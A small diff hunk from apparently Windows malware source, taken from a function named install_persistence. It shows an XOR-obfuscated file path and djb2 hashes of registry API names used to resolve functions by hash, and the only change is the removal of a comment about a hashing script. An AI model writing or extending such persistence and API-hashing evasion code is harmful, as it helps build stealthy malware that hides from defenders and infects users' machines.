@@ -30,7 +30,6 @@ bool install_persistence(const char* current_exe_path) {
     char enc_DestFile[] = { 0x03, 0x3c, 0x1b, 0x15, 0x77, 0x01, 0x5a, 0x15, 0x17, 0x66, 0x04, 0x0f, 0x52, 0x0d, 0x3a, 0x71, 0x16, 0x0d, 0x15, 0x33 };
 
     // API hashes
-    // NOTE: calculate these using hasher.py
     DWORD hash_RegOpenKeyExA = 0x074A975C;   // djb2 for "RegOpenKeyExA"
     DWORD hash_RegSetValueExA = 0x345872EA;  // djb2 for "RegSetValueExA"
     DWORD hash_RegCloseKey = 0x736B3702;     // djb2 for "RegCloseKey"
